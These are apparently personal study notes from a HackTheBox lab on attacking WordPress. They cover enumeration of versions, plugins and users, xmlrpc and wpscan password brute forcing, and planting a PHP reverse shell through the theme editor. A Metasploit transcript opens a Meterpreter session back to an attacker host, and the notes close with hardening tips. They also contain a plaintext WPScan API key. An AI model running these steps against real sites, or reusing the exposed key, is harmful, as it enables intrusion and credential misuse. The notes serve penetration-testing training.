
- Require LAMP stack to be installed 
- webroot located at `/var/www/html`.

```shell-session
pradyun2005@htb[/htb]$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

- `index.php`  homepage of WordPress.
-  `license.txt` contains useful information  version WordPress installed.
-  `wp-activate.php` email activation process when setting up a new WordPress site.
- `wp-admin` folder contains the login page for administrator access and backend dashboard
	-  `/wp-admin/login.php`
	- `/wp-admin/wp-login.php`
	- `/login.php`
	- `/wp-login.php`
- `xmlrpc.php` API make the ability to talk to your WordPress site [XML-RPC](https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32)


## WordPress Configuration File

- `wp-config.php`  contains information required by WordPress to connect to the database



## Key WordPress Directories

-  `wp-content` folder where plugins and themes are stored.

```shell-session
pradyun2005@htb[/htb]$ tree -L 1 /var/www/html/wp-content
.
├── index.php
├── plugins
└── themes
```



- `wp-includes` directory where core files are stored (certificates,fonts,js,widgets)

```shell-session
pradyun2005@htb[/htb]$ tree -L 1 /var/www/html/wp-includes
.
├── <SNIP>
├── theme.php
├── update.php
├── user.php
├── vars.php
├── version.php
├── widgets
├── widgets.php
├── wlwmanifest.xml
├── wp-db.php
└── wp-diff.php
```




# User Roles

|**Role**|**Description**|
|---|---|
|**Administrator**|- Full access to all administrative features.<br> - Can add, delete, and edit other users' roles and posts.<br> - Has the ability to edit the source code of the site.<br> - Ultimate control over the entire website.|
|**Editor**|- Can publish and manage all posts, including those of other users.<br> - Has significant content management capabilities.<br> - Cannot change site settings or user roles.|
|**Author**|- Can publish and manage their own posts only.<br> - Cannot edit or manage posts by other users.<br> - Has limited content creation capabilities compared to an editor.|
|**Contributor**|- Can write and manage their own posts.<br> - Cannot publish posts; needs approval from an Editor or Administrator.<br> - Suitable for guest writers or less trusted content creators.|
|**Subscriber**|- Can only browse and read posts on the site.<br> - Can edit their own profile.<br> - No permissions to create or manage content.|


# Core Version Enumeration
#### WP Version - Source Code

- source code reveal `[CTRL + U]` or use `curl`
```html
<meta name="generator" content="WordPress 5.3.3" />
```

#### WP Version - CSS
```html
...SNIP...
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3' type='text/css' media='all' />
...SNIP...
```


#### WP Version - JS

```html
...SNIP...
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'></script>
...SNIP...
```

 - `readme.html`


# Plugins and Themes Enumeration

#### Plugins
- extend the functionality
- Contact Form 7 plugin => add contact form

```shell-session
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

#### Themes

- control the appearance and layout


```shell-session
curl -s -X GET http://fsociety.web | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```


#### Plugins Active Enumeration

- fuzz for plugin/themes directory untill `200 OK` , `301 moved`
- `/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt`
- same for themes enumeration


# Directory Indexing

- plugin is deactivated => still accessible
- ==Deactivating a vulnerable plugin =>does not improve security==

![[Pasted image 20240714190940.png]]


![[Pasted image 20240714191044.png]]


```shell-session
curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```


# User Enumeration

## First Method

- using post author , uncover user id 
![[Pasted image 20240715181755.png]]

- admin user id 1

#### Existing User

![[Pasted image 20240715181837.png]]

#### Non-Existing User

![[Pasted image 20240715181907.png]]

## Second Method

- WordPress core  <= 4.7.1 shows all user who published post
- `/wp-json/wp/v2/users`


```shell-session
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```





# Login

- obtain username before
- login bruteforce using `xmlrpc.php` or `login page`

![[Pasted image 20240715190432.png]]
- use intruder to bruteforce (check response size)

```shell-session
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```


- list of available methods
```
curl -X POST http://83.136.255.222:40847/xmlrpc.php --data-binary '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'  | \
sed -n 's/.*<value>.*<\/value>.*/&/p' | wc -l
```



## WPSCAN

- apikey
```
DWbJssFVqvwafE3skaEydLStaBAOcsdFXtsuVKreaHo
```

-  `--enumerate` enumerate plugins, themes, users, media, and backups



# Attacking WordPress Users

## WordPress User Bruteforce

- login brute force attacks, `xmlrpc` and `wp-login`
	-  **wp-login method**: Brute forces the normal WordPress login page.
	- **xmlrpc method**: Uses the WordPress API to attempt logins through `/xmlrpc.php`.
	- xmlrpc faster





- password brute

```shell-session
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```




# Remote Code Execution (RCE) via the Theme Editor


## Attacking the WordPress Backend


- log in with administrator credentials
- Appearance - Theme Editor
- select an inactive theme avoid corruption `404.php`
- add php rev shell


# Attacking WordPress with Metasploit



```shell-session
msf5 > search wp_admin

Matching Modules
================

#  Name                                       Disclosure Date  Rank       Check  Description
-  ----                                       ---------------  ----       -----  -----------
0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
```


```shell-session
msf5 > use 0

msf5 exploit(unix/webapp/wp_admin_shell_upload) >
```

```shell-session
msf5 exploit(unix/webapp/wp_admin_shell_upload) > options
```

```shell-session
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.10.16.8z4444
[*] Authenticating with WordPress using admin:Winter202@...
[+] Authenticated with WordPress
[*] Uploading payload...
[*] Executing the payload at /wp—content/plugins/YtyZGFIhax/uTvAAKrAdp.php...
[*] Sending stage (38247 bytes) to blog.inlanefreight.com
[*] Meterpreter session 1 opened
[+] Deleted uTvAAKrAdp.php

meterpreter > getuid
Server username: www—data (33)
```


# WordPress Hardening

- **Perform Regular Updates**: modify the `wp-config.php`
```php
define( 'WP_AUTO_UPDATE_CORE', true );
```

```php
add_filter( 'auto_update_plugin', '__return_true' );
```

```php
add_filter( 'auto_update_theme', '__return_true' );
```

## Enhance WordPress Security

#### [Sucuri Security](https://wordpress.org/plugins/sucuri-scanner/)

- This plugin is a security suite consisting of the following features:
    - Security Activity Auditing
    - File Integrity Monitoring
    - Remote Malware Scanning
    - Blacklist Monitoring.

#### [iThemes Security](https://wordpress.org/plugins/better-wp-security/)

- iThemes Security provides 30+ ways to secure and protect a WordPress site such as:
    - Two-Factor Authentication (2FA)
    - WordPress Salts & Security Keys
    - Google reCAPTCHA
    - User Action Logging

#### [Wordfence Security](https://wordpress.org/plugins/wordfence/)

- Wordfence Security consists of an endpoint firewall and malware scanner.
    - The WAF identifies and blocks malicious traffic.
    - The premium version provides real-time firewall rule and malware signature updates
    - Premium also enables real-time IP blacklisting to block all requests from known most malicious IPs.




